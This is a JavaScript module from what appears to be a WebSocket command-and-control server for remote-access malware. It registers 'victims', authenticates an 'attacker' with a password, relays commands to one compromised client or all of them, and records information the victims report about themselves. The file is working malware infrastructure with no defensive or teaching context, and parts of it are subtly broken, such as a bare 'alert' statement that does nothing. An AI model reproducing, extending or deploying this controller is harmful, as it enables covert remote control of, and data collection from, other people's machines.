
const log = require('./log');
const colors = require('colors');

// id, ws, args, reply, clients, victims, attacker, broadcast, alert, isAttacker

// This module manages the commands that the server can receive from the clients and the attacker.
// NOTE: BOTH the Clients and the Attacker...

/**
 * @typedef {Array<{[key: string]: string}>} Arguments
 * @typedef {(A: { id: string, reply: (args: (Arguments, type: string) => void), args: Arguments, attacker: { id: string; ws: WebSocket }, victims: Array<{ id: string, ws: WebSocket, info?: {[key: string]: string} }>, alert: (args: Arguments, victim_id: string, type: string) => void, ws: WebSocket, isAttacker: (string) => boolean}) => void} Command
 * @type {Object.<string, Command>}
 */

let modules = {
    "instruction": ({ id, args: arguments, victims }) => {
        let { target, command, args } = arguments;

        if (target === 'all')
            victims.forEach(victim => {
                victim.ws.send(JSON.stringify({ id, type: 'instruction', args: { command, args } }));
            });

        else {
            let victim = victims.find(victim => victim.id === target);
            if (victim) victim.ws.send(JSON.stringify({ id, type: 'instruction', args: { command, args } }));
        }
    },

    "register": ({ id, args, victims, attacker, alert, ws, reply }) => {
        let { role } = args;

        if (role === 'victim') {
            victims.push({ id, ws });
            log.tell('New victim connected: ' + id, colors.green, true);
            alert
        }

        else if (role === 'attacker') {
            let { password } = args;

            if (password === process.env['ADMINPASS']) {

                attacker.ws = ws;
                attacker.id = id;

                // delete attacker from victims for security reasons...
                victims = victims.filter(victim => victim.id !== id);

                log.info('New attacker connected: ' + id, true);

                alert({
                    clients: victims
                }, 'register_success');
            }

            else {
                log.error("Invalid password for attacker, disconnecting...", true);
                ws.close();
            }
        }
    },

    "connection": ({ id, args, victims, isAttacker }) => {
        let { info } = args;

        if (!isAttacker(id)) {
            let victim = victims.find(victim => victim.id === id);

            if (victim) {
                victim.info = info;
                log.info('Victim info updated: ' + id, true);
            }
        }

        log.tell('New Info received: ' + JSON.stringify(info), colors.green, true);
    },

    "show_clients": ({ id, reply, victims, isAttacker }) => {
        if (isAttacker(id))
            reply({ clients: victims }, 'show_clients');
    }
}

module.exports = modules;
